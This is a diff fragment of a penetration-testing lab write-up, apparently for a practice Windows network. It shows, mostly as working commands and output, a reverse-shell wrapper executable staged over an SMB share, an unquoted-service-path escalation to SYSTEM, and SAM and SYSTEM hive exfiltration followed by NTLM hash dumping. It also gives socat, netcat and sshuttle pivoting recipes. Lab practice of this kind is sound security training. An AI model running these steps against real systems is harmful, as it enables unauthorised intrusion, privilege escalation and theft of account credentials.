 35. We will make a `Wrapper.cs` file with code:
+
 ```cs
 using System;
 using System.Diagnostics;
@@ -1292,11 +1398,15 @@ namespace Wrapper{
     }
 }
 ```
+
 36. Then we will make an `.exe` fille with mcs
+
 ```console
 ❯ mcs Wrapper.cs
 ```
+
 37. Then we will setup  a samba serever with impacket
+
 ```console
 ❯ sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
 [sudo] password for divu050704:
@@ -1309,7 +1419,9 @@ Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corpo
 [*] Config file parsed
 [*] Config file parsed
 ```
+
 38. Now in our reverse shell we can authenticate for samba
+
 ```console
 C:\xampp\htdocs\resources\uploads>net use \\10.50.85.113\share /USER:user s3cureP@ssword
 net use \\10.50.85.113\share /USER:user s3cureP@ssword
@@ -1321,15 +1433,21 @@ net use \\10.50.85.113\share /USER:user s3cureP@ssword
 [*] Connecting Share(2:share)
 The command completed successfully.
 ```
+
 39. After Authenticating copy `.exe` file to the Machine
+
 ```console
 C:\xampp\htdocs\resources\uploads>copy \\10.50.85.113\share\Wrapper-divu050704.exe %TEMP%\wrapper-divu050704.exe
 copy \\10.50.85.113\share\Wrapper-divu050704.exe %TEMP%\wrapper-divu050704.exe
         1 file(s) copied.
 ```
+
 40. Start a netcat listener on the port specified `4444` in this case.
+
 41. Now run wrapper.exe  and catch a reverse shell to test.
+
 42. The executable works because got a reverse shell.
+
 ```console
 ❯ nc -lvnp 4444
 listening on [any] 4444 ...
@@ -1344,6 +1462,7 @@ wreath-pc\thomas
 C:\xampp\htdocs\resources\uploads>
 
 ```
+
 43. Stop the samba server `net use \\10.50.82.236\share /del`
 
 44. We will use unquoted path vulnerability to on Windows Service (`C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`) to execute a reverse shell as administrator rights.
@@ -1351,6 +1470,7 @@ C:\xampp\htdocs\resources\uploads>
 45. We Will place our Wrapper.exe to `C:\Program Files (x86)\System Explorer\System.exe` and execute it
 
 46. Copy the file to the desired path.
+
 ```console
 C:\xampp\htdocs\resources\uploads>copy %TEMP%\wrapper-divu050704.exe "C:\Program Files (x86)\System Explorer\System.exe"
 copy %TEMP%\wrapper-divu050704.exe "C:\Program Files (x86)\System Explorer\System.exe"
@@ -1362,6 +1482,7 @@ copy %TEMP%\wrapper-divu050704.exe "C:\Program Files (x86)\System Explorer\Syste
 
 
 48. The exploit will start when the service is restarted, which can be done by two ways either by rebooting the system or stopping the `System Explorer` service and start it agin manually. 
+
 ```console
 C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
 sc stop SystemExplorerHelpService
@@ -1385,7 +1506,9 @@ The service did not respond to the start or control request in a timely fashion.
 C:\xampp\htdocs\resources\uploads>
 
 ```
+
 49. Recieved a reverse shell with root previleges
+
 ```console
 ❯ nc -lvnp 4444
 listening on [any] 4444 ...
@@ -1397,6 +1520,7 @@ C:\Windows\system32>
 ```
 
 50. Dump hashes and boot key from the remote machine to local machine 
+
 ```console
 C:\Windows\Temp>reg.exe save HKLM\SAM sam.bak
 reg.exe save HKLM\SAM sam.bak
@@ -1408,6 +1532,7 @@ The operation completed successfully.
 ```
 
 51. Start the samba server on the attacking machine
+
 ```console
 ❯ sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
 [sudo] password for divu050704: 
@@ -1420,14 +1545,18 @@ Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corpo
 [*] Config file parsed
 [*] Config file parsed
 ```
+
 52. Connect to the server from attacking machine
+
 ```console
 C:\Windows\Temp>net use \\10.50.82.236\share /USER:user s3cureP@ssword
 net use \\10.50.82.236\share /USER:user s3cureP@ssword
 The command completed successfully.
 
 ```
+
 53. Move the files to the local machine.
+
 ```console
 C:\Windows\Temp>move sam.bak \\10.50.82.236\share
 move sam.bak \\10.50.82.236\share
@@ -1439,6 +1568,7 @@ move system.bak \\10.50.82.236\share
 ```
 
 54. Stop the samba server 
+
 ```console
 C:\Windows\Temp>net use \\10.50.82.236\share /del
 net use \\10.50.82.236\share /del
@@ -1446,7 +1576,9 @@ net use \\10.50.82.236\share /del
 
 
 ```
+
 55. Now dump the hashes
+
 ```console
 ❯ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
 
@@ -1464,11 +1596,16 @@ Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
 ```
 
 # Pivoting
+
 Pivoting is used to forward a port of comprised machine to the attacking machine or to access local devices which are not accessable via internet.
 Pivoting can also be used for encrypting reverse shells
+
 ## Socat 
+
 Socat can be used for port forwarding. 
+
 ### Reverse Shell
+
 ```console
 # target machine
 [root@prod-serv tmp]# ./socat tcp-l:8000 tcp:ATTACKING_IP:ATTACKIG_PORT
@@ -1478,13 +1615,16 @@ Socat can be used for port forwarding.
 [root@prod-serv tmp]# nc 127.0.0.1 8000 -e /bin/bash 
 ```
 ### Port Forwarding - Easy 
+
 ```console
 # target machine
 [root@prod-serv tmp]# ./socat tcp-l:ATTACKING_PORT,fork,reuseaddr tcp:TARGET_IP:TARGET_PORT
 ``` 
+
 **The will create a forward port, from target machine to the Attacking machine, but will open a port on the target machine which can trigger alarm if the network is being sniffed.**
 
 ### Port Forwarding - Quiet
+
 ```console
 # Attacking machine
 ❯ socat tcp-l:8001 tcp-l:8000,fork,reuseaddr  & 
@@ -1492,11 +1632,15 @@ Socat can be used for port forwarding.
 [root@prod-serv tmp]# ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT
 ```
 ## Sshuttle
+
 1. If you are having the username and password of the user for ssh 
+
 ```console
 ❯ sshuttle -r USER@IP IP/24 -x IP
 ```
+
 2. If you are having private key then
+
 ```console
 ❯ sshuttle -r USER@IP --cmd-ssh "-i PRIV_KEY" IP/24 -x IP
 
